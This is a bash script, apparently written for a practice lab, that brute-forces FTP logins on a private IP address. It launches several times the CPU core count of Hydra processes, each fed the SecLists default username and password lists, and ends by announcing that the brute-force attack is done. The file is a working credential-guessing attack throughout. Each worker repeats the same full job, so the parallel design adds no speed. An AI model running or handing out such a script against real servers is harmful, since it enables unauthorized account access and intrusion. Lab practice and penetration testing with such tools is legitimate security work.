#!/bin/bash

# Target FTP server IP address
FTP_SERVER="10.129.158.92"

# Path to the username and password lists
USERNAME_LIST="/usr/share/seclists/Usernames/cirt-default-usernames.txt"
PASSWORD_LIST="/usr/share/seclists/Passwords/cirt-default-passwords.txt"

# Check if the username and password files exist
if [ ! -f "$USERNAME_LIST" ]; then
    echo "Error: Username file '$USERNAME_LIST' not found."
    exit 1
fi

if [ ! -f "$PASSWORD_LIST" ]; then
    echo "Error: Password file '$PASSWORD_LIST' not found."
    exit 1
fi

# Determine the number of CPU cores
NUM_CORES=$(nproc)
NUM_WORKERS=$((NUM_CORES * 4))  # Example: Use 4 times the number of CPU cores

# Array to store background process IDs
declare -a PID_ARRAY=()

# Loop through each worker
for ((i=0; i<$NUM_WORKERS; i++))
do
    # Execute Hydra with the username and password lists
    hydra -F -q -L "$USERNAME_LIST" -P "$PASSWORD_LIST" ftp://$FTP_SERVER &
    
    # Store the process ID (PID) of each Hydra instance in the array
    PID_ARRAY+=($!)
done

# Wait for all workers to complete
for pid in "${PID_ARRAY[@]}"
do
    wait $pid
done

echo "Brute-force attack completed."
